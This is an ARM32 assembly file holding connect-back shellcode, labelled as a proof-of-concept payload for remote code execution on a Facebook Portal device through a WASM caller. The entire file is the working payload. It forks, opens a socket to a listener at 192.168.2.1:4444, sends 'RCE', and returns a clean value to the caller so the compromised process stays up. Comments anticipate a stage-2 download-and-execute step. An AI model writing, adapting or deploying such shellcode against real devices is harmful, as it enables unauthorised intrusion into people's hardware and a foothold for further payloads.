/*
 * ARM32 (ARMv7) connect-back shellcode for Facebook Portal RCE
 * Connects to 192.168.2.1:4444, sends "RCE\n", exits
 *
 * Process is 32-bit ARM running on ARM64 kernel (compat mode)
 * Uses ARM EABI syscall convention (r7 = syscall number, SVC #0)
 *
 * Syscall numbers (ARM EABI):
 *   fork    = 2
 *   exit    = 1
 *   write   = 4
 *   socket  = 281
 *   connect = 283
 */

.syntax unified
.arch armv7-a
.arm

.global _start
_start:

    /* === fork() === */
    mov     r7, #2              /* __NR_fork */
    svc     #0
    cmp     r0, #0
    bne     parent              /* parent: r0 > 0 */

    /* === CHILD PROCESS === */

    /* socket(AF_INET=2, SOCK_STREAM=1, 0) */
    mov     r0, #2              /* AF_INET */
    mov     r1, #1              /* SOCK_STREAM */
    mov     r2, #0              /* protocol */
    movw    r7, #281            /* __NR_socket */
    svc     #0
    mov     r4, r0              /* save sockfd in r4 */

    /* Build sockaddr_in on stack */
    sub     sp, sp, #16
    mov     r1, #2              /* sin_family = AF_INET */
    strh    r1, [sp, #0]
    movw    r1, #0x5C11         /* sin_port = htons(4444) = 0x5C11 */
    strh    r1, [sp, #2]
    /* sin_addr = 192.168.2.1 -> network order on LE = 0x0102A8C0 */
    movw    r1, #0xA8C0
    movt    r1, #0x0102
    str     r1, [sp, #4]
    mov     r1, #0
    str     r1, [sp, #8]        /* zero padding */
    str     r1, [sp, #12]

    /* connect(sockfd, &addr, 16) */
    mov     r0, r4
    mov     r1, sp
    mov     r2, #16
    movw    r7, #283            /* __NR_connect */
    svc     #0

    /* write(sockfd, "RCE\n", 4) */
    mov     r0, r4
    movw    r1, #0x4352         /* "RC" in LE */
    movt    r1, #0x0A45         /* "E\n" in LE */
    push    {r1}                /* push string to stack */
    mov     r1, sp
    mov     r2, #4
    mov     r7, #4              /* __NR_write */
    svc     #0

    /* === Download and execute stage2 === */
    /* For now, just write "id" command output to prove RCE */
    /* Full stage2 will be added after POC confirmed */

    /* exit(0) */
    mov     r0, #0
    mov     r7, #1              /* __NR_exit */
    svc     #0

parent:
    /* Parent process: return 42 to WASM caller */
    /* V8 WASM expects return value in r0 */
    mov     r0, #42
    bx      lr
